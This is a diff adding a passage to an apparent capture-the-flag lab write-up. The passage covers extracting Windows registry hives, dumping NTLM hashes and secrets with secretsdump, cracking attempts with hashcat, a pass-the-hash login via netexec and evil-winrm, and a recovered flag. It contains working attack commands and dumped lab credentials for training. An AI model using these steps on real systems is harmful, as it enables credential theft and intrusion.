@@ -561,8 +561,56 @@ reg save HKLM\SAM SAM.SAVE
 ```
 After saving this to the Templates directory, we do not see the files on the file management system which means that the file extension .SAVE needs to be allowed in the Security settings in order for the user to see the files. After adding .SAVE, we now can see the registry hives and download them to our attack box. 
 
-Now we run ./secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
+Now make sure you have impacket installed with the command python3 -m pipx install impacket.
+Then we run secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
 to extract NTLM hashes:
 ```
+[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:c2867b38e5a7653355419755b585433a004809c6a63fd834a105e8ba225e844ea69a1dbb7c8be6da8b955d7593f0a6e797ac99813a8d2fc92b037d609fc8f6d830c3dd202fbb038c979504896fdf8360df86cf6728ddb49421104ac94a772f37dba534962171ea8b47416849c35f4cd68e88364742741f888a8c24ada5177206e4a874d5a063a6d545f8e50ee5dfa42a1838d2a94757e6b5ab2d2f0b9d4ef5faf55333ced5e003c616554cafec674eade669c66c4631c6b9c33cc6ab40fc926db33bc801bbb26a7aca6ac42face72eb5647c890f478cc353b27e5c7bed305343bedb652456c10c7c88a4b76ac56731a8
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:92fddd46508b3a41d7e1e99ffcb17efa
+[*] DefaultPassword 
+(Unknown User):Gr8hambino!
+```
+We now have the NTLM hash for the Administrator account: 0e20798f695ab0d04bc138b22344cea8, we try to crack it with hashcat and rockyou.txt wordlist:
+```
+sudo hashcat -m 1000 hash.txt rockyou.txt
+```
+Unfortunately our wordlist was too weak to crack the password, so we can try using a pass-the-hash attack with netexec from DMZ01:
+```
+proxychains netexec smb 172.16.8.20 --local-auth -u Administrator -H 0e20798f695ab0d04bc138b22344cea8
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:135  ...  OK
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
+```
+I tried installing crackmapexec first, but no matter which way I installed it or ran the command it would not work, possibly because the repository is abandoned and left unupdated. I found NetExec which seems to be a working updated fork. 
 
+Now we know that we can successfully authenticate with a pass-the-hash attack. We use Evil-WinRM to easily authenticate to the DEV host:
+```
+proxychains evil-winrm -i 172.16.8.20 -u Administrator -H 0e20798f695ab0d04bc138b22344cea8
+```
+Now that we have SYSTEM, we can do a Windows find command to search for flag files:
+```
+Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*flag*" }
+
+C:\Users\Administrator\Desktop
+C:\Share
+C:\Documents and Settings\Administrator\Desktop
+```
+After a long journey, we finally get the 15th flag from C:\Users\Administrator\Desktop:
+```
+K33p_0n_sp00fing!
+```
 
